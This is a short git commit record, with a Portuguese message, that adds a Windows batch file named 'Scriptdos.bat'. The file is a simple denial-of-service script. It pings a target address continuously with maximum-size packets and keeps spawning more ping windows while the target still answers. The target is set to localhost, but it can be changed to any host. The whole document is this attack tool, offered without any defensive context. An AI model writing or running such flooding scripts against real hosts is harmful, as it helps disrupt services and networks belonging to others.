1abc9bb99c820add2225e27857c68798aa215d9e
Caio <Caiokaikai@gmail.com>
2024-03-02 19:14:18 -0300

    Ferramenta atribuida!

---
+++ Scriptdos.bat
@@ -0,0 +1,14 @@
+@echo off
+
+set Target=127.0.0.1
+
+:loop
+ping %Target% -l 65500 -n 1000 -t | findstr /C:"Reply from" > nul
+if %errorlevel%==0 (
+    start cmd /c "ping %Target% -l 65500 -n 1000 -t"
+    goto loop
+) else (
+    taskkill /IM ping.exe /F
+    cls
+    exit
+)
